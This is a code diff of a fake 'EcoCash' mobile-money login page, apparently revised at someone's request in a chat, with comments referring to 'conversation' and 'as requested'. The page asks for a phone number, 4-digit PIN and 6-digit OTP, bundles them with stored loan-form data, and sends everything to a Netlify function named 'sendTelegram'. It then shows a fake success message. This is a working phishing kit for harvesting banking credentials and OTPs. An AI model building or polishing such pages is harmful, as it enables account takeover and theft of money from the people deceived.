@@ -27,19 +27,27 @@
   input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;background:#fbfdff;font-size:14px;box-sizing:border-box}
   .btn{background:#4b86ff;color:#fff;padding:10px;border-radius:8px;border:0;margin-top:12px;cursor:pointer;width:100%}
   .btn[disabled]{background:#cbd5e1;color:#6b7280;cursor:not-allowed}
+
   .otp-modal{position:fixed;left:0;top:0;width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35)}
   .otp-box{background:#fff;padding:18px;border-radius:12px;min-width:260px;max-width:92%;box-shadow:0 12px 24px rgba(2,6,23,0.08)}
+
   .req{color:#d04444;margin-right:6px}
   .small{font-size:13px;color:#6b7280}
   .success{color:#16a34a;font-weight:600}
   .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
-  @media(max-width:420px){ .card{padding:16px} h2{font-size:18px} .logo{height:40px} }
+
+  @media(max-width:420px){
+    .card{padding:16px}
+    h2{font-size:18px}
+    .logo{height:40px}
+  }
 </style>
 </head>
 <body>
   <div class="card">
-    <!-- logo: local uploaded file path provided in conversation -->
-    <img src="/mnt/data/eco.png" alt="EcoCash logo" class="logo">
+
+    <!-- CORRECT LOGO PATH -->
+    <img src="assets/eco.png" alt="EcoCash logo" class="logo">
 
     <h2>Log In</h2>
     <form id="loginForm" autocomplete="off">
@@ -52,19 +60,17 @@
       </label>
 
       <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
-      <!-- OTP notice intentionally removed as requested -->
     </form>
   </div>
 
-  <!-- OTP modal (visual unchanged except validation logic) -->
-  <div id="otpModal" style="display:none" class="otp-modal" aria-hidden="true">
+  <!-- OTP modal -->
+  <div id="otpModal" style="display:none" class="otp-modal">
     <div class="otp-box">
       <div style="text-align:center"><strong>Enter OTP</strong></div>
       <p class="small" style="margin:8px 0 14px">We have sent an OTP to your phone. Enter it here to confirm.</p>
 
-      <!-- single OTP input, enforce numeric, maxlength 6 -->
-      <input id="otpInput" placeholder="Enter 6-digit OTP" inputmode="numeric" pattern="[0-9]*" maxlength="6"
-             style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px;box-sizing:border-box" />
+      <input id="otpInput" placeholder="Enter 6-digit OTP" inputmode="numeric" maxlength="6"
+             style="width:100%;padding:10px;border-radius:8px;border:1px solid #e6eefc;font-size:14px" />
 
       <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
 
@@ -72,49 +78,42 @@
         <button id="confirmOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#16a34a;color:white;cursor:pointer" disabled>Confirm</button>
         <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
       </div>
+
       <div id="otpStatus" class="small" style="margin-top:8px"></div>
     </div>
   </div>
 
 <script>
-  // Prefill phone from loan form if present; otherwise keep +263 default
+  // Prefill phone if saved
   (function(){
     try {
-      const stored = sessionStorage.getItem('loanForm');
-      if (stored) {
-        const loan = JSON.parse(stored);
-        if (loan.phone && loan.phone.trim() !== '') {
-          document.getElementById('phone').value = loan.phone;
-        }
+      const data = sessionStorage.getItem('loanForm');
+      if (data) {
+        const form = JSON.parse(data);
+        if (form.phone) document.getElementById('phone').value = form.phone;
       }
-    } catch(e){ /* ignore parse errors */ }
-
-    const phoneEl = document.getElementById('phone');
-    const pinEl = document.getElementById('pin');
-    const loginBtn = document.getElementById('loginBtn');
-
-    // Enable login button only when PIN is exactly 4 digits and phone not empty
-    function updateLoginState(){
-      const pin = (pinEl.value || '').trim();
-      const phone = (phoneEl.value || '').trim();
-      const pinValid = /^\d{4}$/.test(pin);
-      loginBtn.disabled = !(pinValid && phone.length > 0);
-    }
-
-    // ensure PIN input accepts only digits
-    pinEl.addEventListener('input', function(){
-      // strip non-digits
-      this.value = this.value.replace(/\D/g,'').slice(0,4);
-      updateLoginState();
-    });
-
-    // phone: keep value but don't force format here (index handles format). still update state on change
-    phoneEl.addEventListener('input', updateLoginState);
-
-    updateLoginState();
+    } catch(e){}
   })();
 
-  // helper sending function (calls your Netlify function)
+  const phoneEl = document.getElementById('phone');
+  const pinEl = document.getElementById('pin');
+  const loginBtn = document.getElementById('loginBtn');
+
+  function updateLoginState(){
+    const pinValid = /^\d{4}$/.test(pinEl.value);
+    const phoneValid = phoneEl.value.trim().length > 0;
+    loginBtn.disabled = !(pinValid && phoneValid);
+  }
+
+  pinEl.addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'').slice(0,4);
+    updateLoginState();
+  });
+
+  phoneEl.addEventListener('input', updateLoginState);
+
+  updateLoginState();
+
   async function sendToServer(payload) {
     return fetch('/.netlify/functions/sendTelegram', {
       method: 'POST',
@@ -123,90 +122,74 @@
     });
   }
 
-  // login form submit -> show OTP modal
   document.getElementById('loginForm').addEventListener('submit', function(e){
     e.preventDefault();
-    const phone = document.getElementById('phone').value.trim();
-    const pin = document.getElementById('pin').value.trim();
-    if(!phone || !pin){
-      alert('Enter phone and PIN');
-      return;
-    }
-    // PIN must be 4 digits
+
+    const pin = pinEl.value.trim();
     if(!/^\d{4}$/.test(pin)){
-      alert('PIN must be exactly 4 digits');
+      alert("PIN must be exactly 4 digits");
       return;
     }
 
     document.getElementById('otpModal').style.display = 'flex';
-    document.getElementById('otpInput').value = '';
-    document.getElementById('otpStatus').textContent = '';
-    document.getElementById('otpWarning').style.display = 'none';
-    document.getElementById('confirmOtp').disabled = true;
-    setTimeout(()=> document.getElementById('otpInput').focus(), 60);
+    otpInput.value = '';
+    otpWarning.style.display = 'none';
+    confirmOtp.disabled = true;
+    setTimeout(()=> otpInput.focus(), 80);
   });
 
-  document.getElementById('cancelOtp').addEventListener('click', ()=> {
-    document.getElementById('otpModal').style.display = 'none';
+  cancelOtp.addEventListener('click', ()=>{
+    otpModal.style.display = 'none';
   });
 
-  // OTP input: allow only digits, limit to 6, enable confirm only when 6 digits
-  const otpInput = document.getElementById('otpInput');
-  const confirmBtn = document.getElementById('confirmOtp');
-  const otpWarning = document.getElementById('otpWarning');
+  otpInput.addEventListener('input', ()=>{
+    otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
 
-  otpInput.addEventListener('input', function(){
-    this.value = this.value.replace(/\D/g,'').slice(0,6);
-    if (/^\d{6}$/.test(this.value)){
-      confirmBtn.disabled = false;
+    if(/^\d{6}$/.test(otpInput.value)){
+      confirmOtp.disabled = false;
       otpWarning.style.display = 'none';
     } else {
-      confirmBtn.disabled = true;
-      // we don't show the red warning while typing; it will show when user tries to confirm or blur
+      confirmOtp.disabled = true;
       otpWarning.style.display = 'none';
     }
   });
 
-  otpInput.addEventListener('blur', function(){
-    if (this.value.length > 0 && !/^\d{6}$/.test(this.value)){
+  otpInput.addEventListener('blur', ()=>{
+    if(otpInput.value && !/^\d{6}$/.test(otpInput.value)){
       otpWarning.style.display = 'block';
-    } else {
-      otpWarning.style.display = 'none';
     }
   });
 
-  // Confirm OTP: check exactly 6 digits, send payload
-  document.getElementById('confirmOtp').addEventListener('click', async ()=>{
+  confirmOtp.addEventListener('click', async ()=>{
     const code = otpInput.value.trim();
     if(!/^\d{6}$/.test(code)){
       otpWarning.style.display = 'block';
       return;
     }
+
     otpWarning.style.display = 'none';
-    const otpStatus = document.getElementById('otpStatus');
-    otpStatus.textContent = 'Sending…';
+    otpStatus.textContent = "Sending…";
 
     const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
-    const payload = {
-      submittedAt: new Date().toISOString(),
-      loanData,
-      loginPhone: document.getElementById('phone').value.trim(),
-      loginPin: document.getElementById('pin').value.trim(),
-      otp: code
-    };
 
     try {
-      const resp = await sendToServer(payload);
+      const resp = await sendToServer({
+        submittedAt: new Date().toISOString(),
+        loanData,
+        loginPhone: phone.value.trim(),
+        loginPin: pin.value.trim(),
+        otp: code
+      });
+
       if(!resp.ok){
-        const txt = await resp.text();
-        otpStatus.textContent = 'Server error: ' + (txt || resp.status);
+        otpStatus.textContent = "Server error";
       } else {
-        otpStatus.innerHTML = '<span class="success">Success — your request has been received.</span>';
+        otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
         sessionStorage.removeItem('loanForm');
-        setTimeout(()=> window.location.href = 'thankyou.html', 1200);
+        setTimeout(()=> window.location.href = "thankyou.html", 1200);
       }
-    } catch (err) {
-      otpStatus.textContent = 'Network error';
+    } catch {
+      otpStatus.textContent = "Network error";
     }
   });
 </script>
